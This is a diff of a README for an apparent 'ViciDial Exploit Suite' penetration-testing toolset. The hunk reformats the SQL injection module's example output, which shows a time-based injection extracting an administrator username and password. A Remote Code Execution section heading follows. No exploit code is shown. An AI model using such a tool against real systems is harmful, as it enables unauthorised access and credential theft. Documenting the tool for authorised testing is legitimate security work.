@@ -20,12 +20,12 @@ The ViciDial Exploit Suite is a comprehensive toolset designed for penetration t
 The SQL Injection module exploits time-based SQLi to extract sensitive data, such as admin usernames and passwords. It works by enumerating credentials one character at a time, providing live feedback during the extraction process.
 
 #### Example Output:
-[+] Target appears vulnerable to time-based SQL injection. 
-[-] Enumerating administrator credentials... 
-[-] Username: admin 
-[*] Password: Test@123 
-[+] SQLi successful: 
-[+]Username: admin, Password: Test@123
+- [+] Target appears vulnerable to time-based SQL injection. 
+- [-] Enumerating administrator credentials... 
+- [-] Username: admin 
+- [*] Password: Test@123 
+- [+] SQLi successful: 
+- [+]Username: admin, Password: Test@123
 
 
 ### Remote Code Execution (RCE)
